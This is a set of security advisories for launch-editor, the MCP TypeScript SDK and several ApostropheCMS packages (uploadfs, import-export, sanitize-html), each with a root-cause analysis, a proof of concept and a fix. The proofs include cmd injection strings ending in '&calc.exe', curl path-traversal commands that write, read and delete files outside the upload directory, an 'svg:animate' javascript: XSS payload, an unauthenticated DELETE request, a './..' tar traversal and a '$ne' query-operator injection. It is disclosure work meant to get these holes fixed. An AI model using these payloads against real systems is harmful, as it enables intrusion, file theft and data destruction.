items.content_html:
Summary

launch-editor did not escape % on Windows when passing an argument to cmd. When an environment variable contained a malicious value, it was possible that that content to be executed.

Impact

Only apps that match all of the following conditions are affected:

  • The user uses Windows
  • An attacker can place a file with the malicious filename containing & or %
  • Either of
    • An attacker can inject an environment variable with a malicious value
    • An attacker can add a NTFS alternate data stream to the file placed

Details

Unlike .sh files, .bat / .cmd files on Windows cannot be called directly using child_process.spawn and requires passing them as an argument of cmd.exe. To do so, launch-editor escapes the arguments passed to cmd.exe. But launch-editor did not escape % which is used for environment variables.

Because launch-editor checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.

  • If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set &calc.exe to %ENV%) and call launchEditor with something%ENV%.
  • If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named ~-38%calc.exe), they can call launchEditor with something %CMDCMDLINE:~-38%calc.exe.
  • If the attacker can create a filename containing the %CD% and the subcommand (e.g. &calc.exe ), they can call launchEditor with ./%CD%

References

  • https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-112943
  • https://github.com/vitejs/launch-editor/pull/155
  • https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc
  • https://github.com/vitejs/launch-editor/releases/tag/v2.14.2

items.content_html:
Summary

In affected versions, the experimental tasks feature (taskStore) did not check which session created a task. Clients sharing one InMemoryTaskStore could list, read and cancel each other's tasks.

Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.

Am I affected?

Only if your HTTP server passes taskStore to McpServer or Server. If grep -ri taskstore --exclude-dir=node_modules . finds nothing, you are not affected.

Affected versions: @modelcontextprotocol/sdk 1.24.0 through 1.31.0. The 2.x packages are not affected.

Fix

Upgrade to @modelcontextprotocol/sdk 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.

If you cannot upgrade yet, remove taskStore, or create one InMemoryTaskStore per session.

References

  • https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2925
  • https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa
  • https://github.com/advisories/GHSA-22jm-h49p-29qw
items.title: [@modelcontextprotocol/sdk] MCP TypeScript SDK: Experimental tasks were not tied to the session that created them

items.content_html:
Summary

In affected versions, the SDK's HTTP client transports and OAuth requests followed redirects to any origin.

If an MCP server or authorization server redirected a request to another origin, that origin received custom request headers (such as an X-API-Key set in requestInit.headers) and the mcp-session-id header. On a 307 or 308 it also received the request body, including OAuth token requests with their refresh_token and client_secret.

On current runtimes fetch already drops the Authorization header across origins.

Am I affected?

Yes, if your application uses StreamableHTTPClientTransport, SSEClientTransport, or the SDK's OAuth client functions such as auth(). stdio clients are not affected.

Affected versions:

  • @modelcontextprotocol/sdk all versions through 1.31.0
  • @modelcontextprotocol/client 2.0.0 through 2.2.0

Fix

Upgrade to:

  • 1.x: @modelcontextprotocol/sdk 1.32.0 or later
  • 2.x: @modelcontextprotocol/client 2.3.0 or later

Redirects are now followed only within the same origin, and not at all in browsers. If your MCP server or authorization server redirects to another origin on purpose, configure the final URL instead. Setting redirectPolicy: 'follow' on a transport restores the old behaviour and the exposure.

If a redirect may have reached a host you do not control, rotate the API keys and client_secret your application held and revoke its tokens.

If you cannot upgrade yet, pass a fetch that refuses redirects, for example (url, init) => fetch(url, { ...init, redirect: 'error' }).

References

  • https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-6prh-2h8m-c8cw
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2901
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2902
  • https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d

items.content_html:
Impact

Even though it is correctly applied to guests, contributors, etc., viewRole is not applied to the general public. This means that a secured content type like @apostrophecms/user can in theory be accessed.

This is greatly mitigated by the fact that there is no automatic public REST API for any content type. One has to expressly allow it. However, it does mean that developers can make the mistake of setting up a relationship between a content type like a blog post, and @apostrophecms/user. This could potentially expose some sensitive information if templates were written poorly, e.g. if they JSON-serialized the entire object. Note that password hashes are NOT affected because they reside in a separate collection.

The public demo project and its various flavors must be updated first because it inadvertently relies on the bug.

Patches

4.33.0

Workarounds

Never create relationships with @apostrophecms/user that are intended for non-admin display. If you need a relationship that expresses authorship, create a separate author piece type to publicly represent that.

References

  • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-xf6w-q65w-4f2w

items.content_html:
Summary

The notification module exposes PATCH and DELETE REST endpoints that perform operations directly on the underlying MongoDB collection without verifying that the requester is authenticated or owns the target notification.

As a result, an unauthenticated attacker who obtains a valid notification ID can modify or permanently delete another user's notification.

Affected Code

File

packages/apostrophe/modules/@apostrophecms/notification/index.js

// restApiRoutes
async patch(req, _id) {
  const dismissed = self.apos.launder.boolean(req.body.dismissed);

  if (dismissed) {
    await self.emit('beforeSave', req, { _id, dismissed });

    await self.db.updateOne(
      { _id },
      {
        $set: { dismissed },
        $currentDate: { updatedAt: true }
      }
    );
  }
},

async delete(req, _id) {
  await self.db.deleteMany({ _id });
}

Unlike the GET notification route, these handlers do not verify:

  • Authentication (req.user)
  • Ownership (userId === req.user._id)
  • Authorization or permissions

Instead, the supplied _id is used directly against the raw MongoDB collection.

Root Cause

The notification REST endpoints perform database operations directly using self.db without enforcing authentication or authorization.

While the framework provides permission primitives (req.user, ownership checks, and apos.permission), these endpoints never invoke them. As a result, any request reaching these handlers is processed solely based on the supplied notification ID.

For comparison, the GET notification route correctly checks:

if (!(req.user && req.user._id)) {
  throw self.apos.error('invalid');
}

No equivalent validation exists in the PATCH or DELETE handlers.

Proof of Concept

1. Log in as an administrator

curl -sS -c admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/login/context" \
-o /dev/null

curl -sS \
-b admin_cookies.txt \
-c admin_cookies.txt \
-X POST \
http://localhost:4321/api/v1/@apostrophecms/login/login \
-H "Content-Type: application/json" \
-H "X-XSRF-TOKEN: csrf" \
-d '{
  "username":"admin",
  "password":"AdminP@ssw0rd123!",
  "session":true
}'

2. Create a notification

curl -sS \
-b admin_cookies.txt \
-X POST \
http://localhost:4321/api/v1/@apostrophecms/notification \
-H "Content-Type: application/json" \
-H "X-XSRF-TOKEN: csrf" \
-d '{
  "message":"manual verify test",
  "type":"info"
}'

Example response:

{
  "noteId":"p358r7phi2w8l245ww5130uf"
}

3. Verify the notification exists

curl -sS \
-b admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"

Response:

{
  "notifications":[
    {
      "_id":"p358r7phi2w8l245ww5130uf",
      "userId":"i89h844o5n3nbreis0ugusum",
      "message":"manual verify test"
    }
  ],
  "dismissed":[]
}

4. Access the endpoint without authentication

Create a fresh cookie jar containing only the public CSRF cookie:

rm -f anon_cookies.txt

curl -sS \
-c anon_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/login/context" \
-o /dev/null

Then send the request without any authenticated session:

curl -i \
-b anon_cookies.txt \
-X DELETE \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf" \
-H "X-XSRF-TOKEN: csrf"

Response:

HTTP/1.1 200 OK

5. Verify the notification has been deleted

curl -sS \
-b admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"

Response:

{
  "notifications":[],
  "dismissed":[]
}

The notification belonging to the authenticated administrator has been successfully deleted by an unauthenticated client.

Impact

An attacker who obtains a valid notification ID can:

  • Delete another user's notifications.
  • Mark another user's notifications as dismissed.
  • Suppress security-related or administrative notifications.

The vulnerability primarily affects integrity.

Although notification IDs are generated using CUID2 and are not practically guessable, authorization must not rely on identifier entropy. Any separate information disclosure vulnerability or log exposure that reveals notification IDs would make this issue directly exploitable.

Recommended Fix

Require authentication before processing any modification request.

Additionally, scope all database operations to the authenticated user.

Example:

// patch
async patch(req, _id) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
  const dismissed = self.apos.launder.boolean(req.body.dismissed);
  if (dismissed) {
    await self.emit('beforeSave', req, { _id, dismissed });
    const result = await self.db.updateOne(
      { _id, userId: req.user._id },   // <-- ownership check
      { $set: { dismissed }, $currentDate: { updatedAt: true } }
    );
    if (!result.matchedCount) {
      throw self.apos.error('notfound');
    }
  }
},
// delete
async delete(req, _id) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
  const result = await self.db.deleteMany({ _id, userId: req.user._id });
  if (!result.deletedCount) {
    throw self.apos.error('notfound');
  }
}

Similarly, update the PATCH handler to verify both authentication and ownership before updating notification records.

Recommendation

Every notification modification endpoint should:

  • Require authentication.
  • Verify ownership (userId === req.user._id).
  • Return 403 Forbidden for unauthorized requests.
  • Avoid performing database operations solely using a user-controlled _id.

The same authorization checks should also be applied to any internal helper methods (such as dismiss()) that modify notification state.

Summary

The tar-extraction guard added to @apostrophecms/import-export for GHSA-mwxc-m426-3f78 is a literal substring test for ../, and ./.. does not contain that substring. An entry named ./.. therefore passes the guard, path.join normalizes it to the parent of the export directory, and the resulting fs.WriteStream opens a directory and emits EISDIR with no error listener attached, which terminates the Node process.

Confirmed on default-branch HEAD 1bd5d0a7a6fe880836fa75adad6964f1c577d640, package version 3.6.2.

Details

packages/import-export/lib/formats/gzip.js, in the tar-stream entry handler inside extract(filepath, exportPath):

const name = header.name.replace(/\\/g, '/');
if (name.includes('../')) {
  // skipped
}
...
stream.pipe(fs.WriteStream(path.join(exportPath, name)));

Two separate problems sit in those four lines. The guard tests the raw entry name for a substring instead of resolving the joined path and requiring containment, and the write stream has no error handler, so any stream error becomes an unhandled 'error' event.

Reaching it needs an account that can import, nothing more. packages/import-export/modules/@apostrophecms/import-export-page/index.js exposes post.importExportImport, which calls into lib/methods/import.js; that handler requires req.user and then calls format.input(exportPath), which for a .gz upload is gzip.js calling extract() on the uploaded archive.

PoC

This is not an end-to-end exploit. What follows is each of the three primitives the crash depends on, executed individually, plus a source-level trace of the route. The chain from post.importExportImport to extract() was read, not observed.

The guard misses the payload:

node -e "console.log('./..'.includes('../')); console.log('..'.includes('../')); console.log('a/./..'.includes('../'));"

false
false
false

path.join then resolves it out of the export directory:

node -e "const path=require('path'); const exportPath='/tmp/exportRoot'; console.log(path.join(exportPath,'./..'));"

/tmp

And a write stream opened on a directory, with no error listener, kills the process rather than failing the request:

node -e "const fs=require('fs'); const s=fs.createWriteStream('/tmp'); s.write('x'); s.end(); setTimeout(()=>console.log('still alive'),500);"

events.js:291
      throw er; // Unhandled 'error' event
      ^

Error: EISDIR: illegal operation on a directory, open '/tmp'
Emitted 'error' event on WriteStream instance at:
    at internal/fs/streams.js:361:12
    at FSReqCallback.oncomplete (fs.js:156:23) {
  errno: -21,
  code: 'EISDIR',
  syscall: 'open',
  path: '/tmp'
}

The events.js:291 frame shows that transcript came off the Node 14 line my audit box had. The unhandled-error-event behavior is not version specific, but the exact message on your supported Node versions is worth a re-run.

Source-side confirmation without running anything:

grep -n "includes('../')" packages/import-export/lib/formats/gzip.js
grep -n "WriteStream" packages/import-export/lib/formats/gzip.js

Impact

An authenticated user who can reach the import UI uploads one crafted archive and takes down the Node process handling it. Every worker that picks up such an archive dies the same way.

Suggested fix

Resolve the target and require containment, and attach an error handler:

const base = path.resolve(exportPath);
const target = path.resolve(path.join(exportPath, name));

if (target !== base && !target.startsWith(base + path.sep)) {
  stream.on('end', next);
  stream.resume();
  return;
}

if (header.type === 'directory') {
  fsp.mkdir(target).then(next).catch(reject);
} else {
  const out = fs.WriteStream(target);
  out.on('error', reject);
  stream.pipe(out);
  stream.on('end', next);
}

The error handler earns its place independently. Any tar entry that lands on an existing directory name has the same effect whether or not traversal is involved.

Why this is not GHSA-mwxc-m426-3f78

The name.includes('../') check is the mitigation shipped for GHSA-mwxc-m426-3f78 / CVE-2026-32731. It stops names carrying the literal ../ sequence. It does not canonicalize the joined path, so ./.. and a bare .. still get through, and it did not touch the missing error listener. This report is about what the substring test leaves behind.

AI assistance was used for the code audit and drafting. The exact guard and WriteStream lines in packages/import-export/lib/formats/gzip.js at the stated HEAD were manually verified, the import route from the page module through lib/methods/import.js into the entry handler were manually traced, and the three Node one-liners were manually ran and copied verbatim.

Summary

The uploadfs library's local storage backend does not validate or sanitize user-supplied paths. The prefixPath() helper only strips double slashes (//) and the backend performs direct string concatenation (uploadsPath + path). An attacker can inject ../ sequences to escape the intended uploads directory, resulting in arbitrary file read, write, and delete on the host filesystem.

Details

Root Cause

packages/uploadfs/uploadfs.js:652-655

https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/uploadfs.js#L652-L655

function prefixPath(path) {
    // Resolve any double // that results from the prefix
    return (self.prefix + path).replace(/\/\//g, '/');
}

packages/uploadfs/lib/storage/local.js

https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L92-L95 https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L102-L104 https://github.com/apostrophecms/apostrophe/blob/main/packages/uploadfs/lib/storage/local.js#L106-L108

copyIn: function(localPath, path, options, callback) {
    const uploadPath = uploadsPath + path;  // [VULNERABLE]
    return copyFile(localPath, uploadPath, callback);
},
streamOut: function(path, options) {
    return fs.createReadStream(uploadsPath + path);  // [VULNERABLE]
},
remove: function(path, callback) {
    const uploadPath = uploadsPath + path;  // [VULNERABLE]
    fs.unlink(uploadPath, callback);
  • prefixPath() does not normalize paths or reject ../.
  • The local backend concatenates the path directly into the filesystem call.
  • Node.js resolves /app/uploads/../../../tmp/pwned.txt → /tmp/pwned.txt.

Proof of Concept (PoC)

Here is the poc files https://drive.proton.me/urls/AKY4V5S0JR#Vw6XJdVCZafk

Build and run

docker load < apostrophe-uploadfs-poc.tar
docker run -d -p 3000:3000 --name uploadfs-poc apostrophe-uploadfs-poc
python3 exploit.py

Expected output

[UPLOAD] Status: 200 | Body: Uploaded to ../../../tmp/pwned.txt
[READ]
Status: 200| Body: You have been pwned!
[+] Vulnerability confirmed: arbitrary file write/read/delete via path traversal.

Manual reproduction

# Write outside uploads directory
curl -X POST http://localhost:3000/upload \
  -F "path=../../../tmp/backdoor.txt" \
  -F "file=@-;filename=backdoor.txt" <<< "malicious content"

# Read it back
curl "http://localhost:3000/read?path=../../../tmp/backdoor.txt"

# Delete it
curl -X DELETE "http://localhost:3000/remove?path=../../../tmp/backdoor.txt"

Impact

Capability Risk
Arbitrary File Write Write to /etc/cron.d/, .ssh/authorized_keys, or webroot files → Remote Code Execution
Arbitrary File Read Exfiltrate /etc/shadow, application configs, database credentials
Arbitrary File Delete Destroy system or application files → Denial of Service

Remediation

Add path containment validation inside uploadfs (and every storage backend) before any filesystem operation:

const path = require('path');
function safePath(base, target) {
  const resolved = path.resolve(base, target);
  if (!resolved.startsWith(path.resolve(base) + path.sep)) {
    throw new Error('Path traversal blocked: target is outside the intended directory');
  }
  return resolved;
}

References

  • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-gmfx-5g6x-rr72
  • https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce
  • https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350

Summary

sanitize-html 2.17.7 introduced animatesUrlAttribute() to block SVG animation elements (animate, animateColor, animateMotion, animateTransform, set) when their attributeName targets a URL sink like href. However, this check is bypassed when the animation element uses a namespace prefix (e.g., svg:animate instead of animate).

Root Cause

The animatesUrlAttribute function (index.js, line ~832) checks svgAnimationTags.indexOf(name.toLowerCase()), where svgAnimationTags contains bare local names: ["animate", "animatecolor", "animatemotion", "animatetransform", "set"]. htmlparser2 passes namespace-prefixed tag names verbatim, so svg:animate does not match animate in the array, causing the function to return false and skip the SMIL XSS protection.

Ironically, the function already handles namespace prefixes correctly for the attributeName target value (line ~843): const localName = target.slice(target.lastIndexOf(":") + 1) — but this same stripping was not applied to the tag name itself.

Proof of Concept

const sanitizeHtml = require("sanitize-html");

const config = {
  allowedTags: false,
  allowedAttributes: false,
  allowedSchemes: ["http", "https"]
};

// Standard animate — BLOCKED by 2.17.7 fix
const blocked = sanitizeHtml(
  `<svg><a href="#safe"><animate attributeName="href" values="#safe;javascript:alert(1)" dur=".01s" fill="freeze"/><text>Click</text></a></svg>`,
  config
);
console.log("Standard animate:", blocked.includes("javascript:") ? "BYPASS" : "BLOCKED");
// Output: BLOCKED

// Namespace-prefixed animate — BYPASSES the fix
const bypassed = sanitizeHtml(
  `<svg><a href="#safe"><svg:animate attributeName="href" values="#safe;javascript:alert(document.domain)" dur=".01s" fill="freeze"/><text>Click</text></a></svg>`,
  config
);
console.log("svg:animate:", bypassed.includes("javascript:") ? "BYPASS" : "BLOCKED");
// Output: BYPASS

All 5 SMIL animation elements are bypassable with any namespace prefix (svg:, xlink:, xml:, uppercase variants). Tested and confirmed on sanitize-html 2.17.7 from the apostrophe monorepo.

Impact

Cross-site scripting (XSS) via SMIL animation retargeting. When an application uses allowedTags: false (common in rich-text editors that want to preserve SVG), an attacker can inject <svg:animate attributeName="href" values="#safe;javascript:..." .../> to override the href attribute of a parent <a> element after the page loads, causing the link to execute JavaScript when clicked.

Suggested Fix

Strip the namespace prefix from the tag name before the lookup, matching the pattern already used for the attribute name target:

// Before (vulnerable):
if (svgAnimationTags.indexOf(name.toLowerCase()) === -1) {

// After (fixed):
const localTagName = name.toLowerCase().slice(name.lastIndexOf(":") + 1);
if (svgAnimationTags.indexOf(localTagName) === -1) {

Affected Versions

sanitize-html >= 2.17.7 (where the SMIL animation protection was introduced). Earlier versions lack the SMIL protection entirely.

Credit

Kai Aizen (SnailSploit) — Adversarial AI & Security Research

References

  • https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce
  • https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350
  • https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.0

Summary

When uploadfs is configured with the Azure backend and sas: true (a supported configuration introduced in uploadfs 1.25.0), createContainer() builds the BlobServiceClient from a URL that embeds the full SAS query string, and Azure SDK v12 derived clients inherit that query string. As a result, getUrl() returns a base URL carrying the complete account/container SAS signature (?sv=...&sig=...), and Apostrophe's attachment.url() prepends it to every public attachment link — broadcasting a container-level SAS credential (commonly sp=rwdlac, full read/write/delete/list) to every site visitor, including anonymous ones. Anyone who can see an attachment URL can read, overwrite, delete, and list every blob in the container for the SAS lifetime. A companion functional bug (blob path appended after the query string, producing broken URLs) shows this code path was never exercised end to end. Shared-key mode (default) and non-Azure backends are not affected.

Verified at commit 5a3746aaed49761e171c2cbfe793267c959829fd (uploadfs 1.27.0 in the apostrophe monorepo).

Details

Root cause: a credential-bearing client URL is reused as the public base URL. The chain:

  • Credential-embedded client: azure.js#L123-L125 — new BlobServiceClient("https://<account>.blob.core.windows.net?<SAS query string>") where cluster.key is the full SAS string including sig
  • Leak point: azure.js#L513-L520 — getUrl() takes getContainerClient(...).getBlobClient('').url as baseUrl; SDK v12 derived clients inherit the SAS query string, so baseUrl already contains ?sv=...&sig=...
  • Public exposure: attachment/index.js#L694 — attachment.url() = uploadfs.getUrl() + path for every rendered attachment link; attachment/index.js#L1503 — getBrowserData() also ships uploadsUrl to every logged-in editor session
  • Companion bug: the blob path is appended after the query string (/container/?sv=...&sig=XXX/attachments/id-name), so these URLs are also broken — evidence the 1.25.0 code path was never tested

Attack surface: every public page rendering attachment URLs (images, download links), plus the uploadsUrl delivered to editor sessions. The leak is passive and unconditional — no action required from the victim beyond serving a page. The credential further propagates through HTML source, logs, Referer headers, and CDN/proxy access logs.

Suggested remediation:

  1. Strip the query string before building public URLs: const u = new URL(blob.svc.getContainerClient(...).getBlobClient('').url); u.search = ''; (or compose accountUrl + '/' + container manually), and append the blob path to the pathname, not after the query.
  2. Document that SAS mode must use least privilege (read-only, ideally sr=b per-blob), and prefer generating short-lived per-blob read-only signed URLs via generateBlobSASQueryParameters instead of embedding a service-level SAS in permanent public URLs.

PoC

Full PoC posted as the first comment below (poc.js + README; offline, no Azure account needed). It replicates the library's exact two steps with the declared dependency @azure/storage-blob@12:

  1. npm install @azure/storage-blob@12 && node poc.js
  2. The script constructs new BlobServiceClient("https://myaccount.blob.core.windows.net?sv=...&sig=FAKESIGNATURE") exactly like createContainer(), then evaluates the getUrl() logic (getContainerClient('uploads-container').getBlobClient('').url) and asserts the resulting base URL still contains the sig parameter.
  3. Observed output (exit code 0):
baseUrl: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATURE
attachment URL as served to visitors: https://myaccount.blob.core.windows.net/uploads-container/?sv=2021-06-08&ss=b&srt=co&sp=rwdlac&se=2099-01-01&sig=FAKESIGNATURE/attachments/abc123-photo.jpg

The produced URL both leaks the token (sv…sig) and demonstrates the broken path placement. Cross-checking attachment/index.js confirms this URL reaches public pages unmodified.

Impact

  • What it is: insufficiently protected credentials (CWE-522) leading to information exposure (CWE-200). A container-level SAS token — commonly granted sp=rwdlac (read/write/delete/list/ACL) — is disclosed to every site visitor including anonymous users, valid for the SAS lifetime (often years). Holders can read, overwrite, delete, and enumerate every attachment in the container; the library applies no narrowing.
  • Who is impacted: Apostrophe sites using uploadfs with the Azure backend and sas: true (introduced in 1.25.0; present through 1.27.0). Default shared-key mode and other backends are unaffected. When the SAS is provisioned read-only, the impact reduces to unauthenticated read/download of all attachments.

Reported by Kimi Security Team (bug-report@moonshot.ai).

References

  • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-hhph-8536-gfq5
  • https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce
  • https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350
  • https://github.com/apostrophecms/apostrophe/releases/tag/uploadfs@1.28.0

Summary ApostropheCMS’s exist-in-locale API allows an authenticated low-privilege user to determine whether restricted documents exist in a specified locale and mode, including draft mode. The endpoint returns localized document identifiers without applying document-level view or edit authorization criteria.

The issue was reproduced against a real local ApostropheCMS application running the reviewed source code. The test used a synthetic guest account and synthetic restricted draft records.

Details Exact vulnerable source path: packages/apostrophe/modules/@apostrophecms/i18n/index.js:503-529 Exact API route: POST /api/v1/@apostrophecms/i18n/exist-in-locale The handler verifies only that the requester is authenticated:

if (!req.user) {
  throw self.apos.error('notfound');
}

It then performs a direct database lookup using attacker-controlled document IDs, locale, and mode:

const found = await self.apos.doc.db.find({
  aposLocale: `${locale}:${mode}`,
  aposDocId: {
    $in: ids.map(self.apos.doc.toAposDocId)
  }
}).project({
  _id: 1,
  aposDocId: 1
}).toArray();

This query does not apply:

.permission('view') .permission('edit') apos.permission.criteria(req, 'view') object-level document authorization locale-specific authorization

The endpoint accepts multiple IDs, making bulk probing possible.

Proof of Concept

The local application was running at: http://127.0.0.1:3000 The test account had the low-privilege role: guest The local database contained synthetic records for the restricted document base ID:

wv2l4rbaplgzkg80zkne4aoz:en:draft
wv2l4rbaplgzkg80zkne4aoz:fr:draft

All credentials and cookies are intentionally redacted below.

POST /api/v1/@apostrophecms/i18n/exist-in-locale HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-guest-session>
Content-Type: application/json
Accept: application/json

{
  "ids": [
    "wv2l4rbaplgzkg80zkne4aoz:en:draft",
    "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"
  ],
  "locale": "fr",
  "mode": "draft"
}

Equivalent command

curl -i -sS -X POST \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/i18n/exist-in-locale' \
  -b /path/to/redacted-guest-cookie-jar.txt \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data-raw '{
    "ids": [
      "wv2l4rbaplgzkg80zkne4aoz:en:draft",
      "ckzzzzzzzzzzzzzzzzzzzzzzz:en:draft"
    ],
    "locale": "fr",
    "mode": "draft"
  }'

Observed response

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "originalLocaleIds": [
    "wv2l4rbaplgzkg80zkne4aoz:en:draft"
  ],
  "newLocaleIds": [
    "wv2l4rbaplgzkg80zkne4aoz:fr:draft"
  ],
  "aposDocIds": [
    "wv2l4rbaplgzkg80zkne4aoz"
  ]
}

The nonexistent ID was omitted from the response. This proves that the endpoint acts as an existence oracle.

Authorization control Using the same authenticated guest session and the localized document identifier returned above, the normal page API was requested:

GET /api/v1/@apostrophecms/page/wv2l4rbaplgzkg80zkne4aoz:fr:draft HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-guest-session>
Accept: application/json

Observed response:

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{
  "name": "forbidden",
  "data": {},
  "message": "forbidden"
}

This demonstrates the authorization boundary clearly:

Request Result
Normal page API for the restricted draft 403 Forbidden
exist-in-locale for the same restricted draft 200 OK with localized document ID
exist-in-locale for a nonexistent ID 200 OK with empty arrays

Additional impact validation

The behavior was also tested across multiple locale and mode combinations:

Query Result
locale=fr, mode=draft Returned wv2l4rbaplgzkg80zkne4aoz:fr:draft
locale=fr, mode=published Returned empty arrays because no published fixture existed
locale=de, mode=draft Returned empty arrays because no German fixture existed
Two IDs in one request Existing ID returned; nonexistent ID omitted

This confirms that the endpoint can be used to discover whether a document has a localized draft in a particular locale and to perform bulk enumeration.

Impact A low-privilege authenticated user can: Probe arbitrary known or guessed document base IDs. Determine whether restricted documents have localized versions. Determine whether unpublished draft versions exist. Identify which locales contain matching records. Obtain exact localized document identifiers. Submit multiple IDs in one request for bulk reconnaissance. The issue does not directly disclose the document body or grant write, publish, or delete privileges. During testing, no content was modified, published, deleted, or exposed beyond the identifier metadata.

Recommended remediation Before executing the database lookup, apply the same document-level authorization criteria used by the normal document API. The query should be restricted to documents the requester is authorized to view in the requested locale and mode. Draft queries should additionally require the appropriate draft-view permission for the specific document, not merely authentication or a global role check. The endpoint should also avoid returning localized document identifiers for records that fail the requester’s document-level permission criteria.

[1] ApostropheCMS i18n source — existInLocale handler, lines 503–529

[2] Official ApostropheCMS i18n API documentation

References

  • https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vmxh-77cw-65j7
  • https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce
  • https://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350
  • https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.33.0
  • https://github.com/advisories/GHSA-vmxh-77cw-65j7

Summary

@apostrophecms/import-export's update-by-key feature lets an imported document carry a <field>:key property (for example slug:key) whose value is used to find an existing document to update instead of inserting a new one. getUpdateKey()/insertOrUpdateDocWithKey() (lib/methods/import.js) use that value directly as a MongoDB query value with no laundering:

const matchingDraftPromise = manager.findForEditing(
  req.clone({ mode: 'draft' }),
  {
    aposMode: 'draft',
    [updateField]: doc[updateKey]
  }).toObject();

Archive documents are parsed with EJSON (see lib/formats/gzip.js), which revives objects such as { $ne: null } as live values, the same untrusted data source and revival mechanism already fixed once in this module for findSingletonAposDocId/findParkedAposDocId in GHSA-79qf-vqgc-7xx3. That fix did not touch insertOrUpdateDocWithKey, so the identical class of bug survives here: a crafted "slug:key": { "$ne": null } entry in an archive's aposDocs.json makes the import match (and then update) an existing document the archive's author never actually identified, instead of failing to find a match.

Impact

Reaching this requires only an authenticated session with import access to the target type (the built-in contributor role holds this, matching the precondition of GHSA-79qf-vqgc-7xx3), and no admin interaction. Because the match uses a MongoDB operator instead of an exact value, it is not limited to a document the importer already knows the identifying field of: any existing document the importer has generic edit rights on and that satisfies the operator (which { $ne: null } trivially does for any doc with a non-null value in that field) is a candidate, and Apostrophe's findForEditing permission filter, not the update-key logic, is the only thing narrowing which document actually gets matched and overwritten.

Live-verified: a contributor-role request importing a document containing "slug:key": { "$ne": null } had its content applied to an existing, unrelated draft article, overwriting its title, while the importer never specified that article's real slug.

Affected versions

Confirmed on main branch HEAD as of 2026-09-04, packages/import-export/lib/methods/import.js.

Suggested fix

items.content_html:
Summary

The client-side helper apos.http.parseQuery() in ApostropheCMS builds a nested object from a URL query string without sanitizing the keys __proto__, constructor, or prototype. Parsing an attacker-controlled query string therefore writes arbitrary properties onto Object.prototype (client-side prototype pollution).

ApostropheCMS's admin UI calls this parser with window.location.search on every authenticated page load (the admin context bar's data() initializer). Because the admin UI is built on Vue, a polluted, enumerable property on Object.prototype is then picked up by Vue's standard element-mount routine and written to the DOM as an element property, turning the prototype pollution into DOM-based XSS in the victim's authenticated session. The escalation gadget is a well-known, general Vue behavior; the novel, reportable defect is the unsanitized parseQuery source together with the authenticated trigger, both of which are ApostropheCMS code.

Any user who can get any logged-in user (from the lowest-privileged guest role up to the highest-privileged admin role) to open a crafted URL can execute arbitrary JavaScript in that user's session.

This is distinct from CVE-2026-53609 (server-side prototype pollution via apos.util.set() / $pullAll, fixed in 4.31.0): different side (client vs server), different code path, and the vulnerable code here is present in the current release.

Package

  • Ecosystem: npm
  • Package: apostrophe
